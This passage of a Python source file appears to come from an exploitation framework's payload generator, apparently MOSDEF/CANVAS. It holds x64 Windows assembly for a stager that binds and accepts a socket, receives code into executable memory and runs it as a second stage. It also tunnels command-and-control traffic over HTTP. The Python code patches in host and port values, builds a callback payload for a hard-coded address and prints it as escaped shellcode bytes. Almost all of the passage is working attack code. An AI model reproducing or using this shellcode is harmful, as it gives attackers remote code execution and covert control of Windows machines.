        add %r13,%rbx // inverse offset from total len

        jmp readfile

        readfile_done:

        // have to close HREQUEST _before HCONNECT
        mov HREQUEST-getpcloc(%rbp),%rcx
        sub $0x20,%rsp // add stack
        call *INTERNETCLOSEHANDLE-getpcloc(%rbp)
        mov HCONNECT-getpcloc(%rbp),%rcx
        call *INTERNETCLOSEHANDLE-getpcloc(%rbp)
        add $0x20,%rsp // recover

        mosdef_send:


        mov FDSPOT_CNCT-getpcloc(%rbp),%rcx
        mov MOSDEF_PAGE-getpcloc(%rbp),%rdx
        mov %r14,%r8
        xor %r9,%r9

        sub $0x20,%rsp

        call *SEND-getpcloc(%rbp)

        add $0x20,%rsp

        cmpl $-1,%eax
        je exit

        jmp select_mosdef_and_http

        mosdef_recv:

        mov FDSPOT_CNCT-getpcloc(%rbp),%rcx
        mov MOSDEF_PAGE-getpcloc(%rbp),%rdx
        mov $0x10000,%r8
        xor %r9,%r9

        sub $0x20,%rsp

        call *RECV-getpcloc(%rbp)

        add $0x20,%rsp

        cmpl $-1,%eax
        je exit

        mov %rax,%r14 // save return value of recv

        // push the data out over HTTP (len in eax)
        http_push:

        push %rsp // align

        mov %r14,%rax // get received length
        mov HREQUEST-getpcloc(%rbp),%rcx
        lea MODE_PUSH_LAST-getpcloc(%rbp),%rdx
        mov $-1,%r8
        mov MOSDEF_PAGE-getpcloc(%rbp),%r9
        push %rax
        sub $0x20,%rsp

        call *HTTPSENDREQUESTA-getpcloc(%rbp)

        add $0x30,%rsp

        test %rax,%rax
        jz exit

        // have to close HREQUEST _before HCONNECT
        mov HREQUEST-getpcloc(%rbp),%rcx
        sub $0x20,%rsp // add stack
        call *INTERNETCLOSEHANDLE-getpcloc(%rbp)
        mov HCONNECT-getpcloc(%rbp),%rcx
        call *INTERNETCLOSEHANDLE-getpcloc(%rbp)
        add $0x20,%rsp // restore

        jmp select_mosdef_and_http

        // not reached from parent
        bind_mosdef:

        //our precious argument passed from createthread is in rcx :)
        mov %rcx,%rbp
        //align stack mmm
        and  $0xFFFFFFF0,%esp
        cld
        mov $2,%rcx
        mov $1,%rdx
        mov $6,%r8
        sub $0x20,%rsp
        call *SOCKET-getpcloc(%rbp)
        add $0x20,%rsp

        mov %rax,FDSPOT_BIND-getpcloc(%rbp)
        mov %rax,%rcx
        //sockaddr
        xor %rbx,%rbx
        push %rbx
        movq $REPLACEHOSTANDPORT,%rbx
        push %rbx
        mov %rsp,%rdx
        //end sockaddr
        mov $0x10,%r8

        sub $0x20,%rsp
        call *BIND-getpcloc(%rbp)
        add $0x20,%rsp

        mov FDSPOT_BIND-getpcloc(%rbp),%rcx
        inc %rax
        mov %rax,%rdx

        sub $0x20,%rsp
        call *LISTEN-getpcloc(%rbp)
        add $0x20,%rsp


        // launch mosdef thread
        //lpThreadAtt
        xor  %rcx,%rcx
        //dwStackSize
        xor  %rdx,%rdx
        //lpStartAddress
        lea   connect_mosdef-getpcloc(%rbp),%r8
        //lpParameter
        mov  %rbp,%r9
        //dwCreationFlags
        push %rcx
        //lpThreadId
        push %rcx
        sub  $0x20,%rsp
        call *CREATETHREAD-getpcloc(%rbp)
        add  $0x20,%rsp


        pushl %eax
        pushl %eax
        mov FDSPOT_BIND-getpcloc(%rbp),%rcx
        xor %rdx,%rdx
        xor %r8,%r8

        sub $0x20,%rsp
        call *ACCEPT-getpcloc(%rbp)
        add $0x20,%rsp

        mov %rax,FDSPOT_BIND-getpcloc(%rbp)

        recvexecloop:

        mov FDSPOT_BIND-getpcloc(%rbp), %rcx

        gogetlen:
        lea MYBUFFER-getpcloc(%rbp),%rdx
        mov $4,%r8
        xor %r9,%r9

        sub $0x20,%rsp

        call *RECV-getpcloc(%rbp)

        add $0x20,%rsp
        cmpb $4, %al
        je gogotlen

        jmp exit_mosdef

        gogotlen:

        xor %rcx,%rcx
        xor %rdx,%rdx
        mov MYBUFFER-getpcloc(%rbp),%edx
        mov $0x1000,%r8
        mov $0x40,%r9
        sub $0x20,%rsp
        call *VIRTUALALLOC-getpcloc(%rbp)
        add $0x20,%rsp

        mov %rax,%rsi //save address allocated in rsi (static)
        mov %rax,%r15 //save address in r15 also
        xor %rdi,%rdi
        mov MYBUFFER-getpcloc(%rbp),%edi //and in rdi the size needed

        gorecvexecloop:

        mov FDSPOT_BIND-getpcloc(%rbp), %rcx
        mov %rsi,%rdx
        mov %rdi,%r8
        xor %r9,%r9
        sub $0x20,%rsp
        call *RECV-getpcloc(%rbp)
        add $0x20,%rsp
        cmpl $-1,%eax

        je exit_mosdef

        cmp %rax,%rdi //if we received all the data..

        je stagetwo

        add %rax,%rsi
        sub %rax,%rdi

        jmp gorecvexecloop

        stagetwo:

        push %r15
        mov %r15,%r14
        mov FDSPOT_BIND-getpcloc(%rbp),%r15 //pass socket in r15

        call *%r14
        pop %r15

        // free
        mov %r15,%rcx //address
        xor %rdx,%rdx
        mov $0x8000,%r8 // MEM_RELASE
        sub $0x20,%rsp
        call *VIRTUALFREE-getpcloc(%rbp)
        add $0x20,%rsp

        jmp recvexecloop

        exit:

        // close the socket so the mosdef thread suicides as well
        mov FDSPOT_BIND-getpcloc(%rbp),%rcx
        sub $0x20,%rsp
        call *CLOSESOCKET-getpcloc(%rbp)
        add $0x20,%rsp

        mov $0x8000,%r8 // release
        xor %rdx,%rdx
        mov MOSDEF_PAGE-getpcloc(%rbp),%rcx
        sub $0x20,%rsp
        call *VIRTUALFREE-getpcloc(%rbp)
        add $0x20,%rsp

        mov HTTPHANDLE-getpcloc(%rbp),%rcx
        sub $0x20,%rsp
        call *INTERNETCLOSEHANDLE-getpcloc(%rbp)
        add $0x20,%rsp

        exit_mosdef:

        xor %rdx, %rdx
        mov $0xfffffffffffffffe, %rcx
        sub $0x20, %rsp
        call *TERMINATETHREAD-getpcloc(%rbp)
        """

        a = istr2int(socket.inet_aton('127.0.0.1'))
        b = reverseword((0x02000000 | random.randint(5000, 10000)))
        host_and_port = "0x%08x%08x" %  (uint_bits(32, a),uint_bits(32,b))
        codegen.main = codegen.main.replace('REPLACEHOSTANDPORT', host_and_port)
        # print host_and_port
        a = istr2int(socket.inet_aton(host))
        b = reverseword((0x02000000 | port))
        host_and_port = "0x%08x%08x" %  (uint_bits(32, a),uint_bits(32,b))
        codegen.main = codegen.main.replace('REPLACEHOSTPORTREMOTE', host_and_port)
        # print host_and_port

        codegen.main = codegen.main.replace('TIMEOUT_USECS', '500000')
        codegen.main = codegen.main.replace('TIMEOUT_SECS', '0')

        if SSL:
            logging.warning("HTTP PROXY Payload enabled SSL")
            codegen.main = codegen.main.replace('FLAGS', '0x84C03100')
        else:
            codegen.main = codegen.main.replace('FLAGS', '0x80400100')

        # this needs to:
        # - bind a localhost mosdef
        # - connect to it
        # - have a HTTP/socket select loop
        # NOTE: protocol is specified in http_proxy.py

        return codegen.get()

if __name__ == '__main__':
    import sys;
    import struct;
    line = 0
    p = payloads()

    #TODO: un-harcode this
    asm = p.cmdcallback("192.168.30.1",5555);


    print asm
    bin = p.assemble(asm)
    # mod 4 align
    while len(bin) % 4:
        bin += "P"
    for c in bin:
        if not line:
            sys.stdout.write("\"")
        sys.stdout.write("\\x%.2x" % ord(c))
        line += 1
        if line == 16:
            sys.stdout.write("\"\n")
            line = 0
    i = 0
    line = 0
    sys.stdout.write("\n");
    while i < len(bin):
        dword = struct.unpack("<L", bin[i:i+4])[0]
        sys.stdout.write("0x%.8X, " % dword)
        line += 1
        i += 4
        if line == 4:
            sys.stdout.write("\n")
            line = 0
    sys.stdout.write("\n")

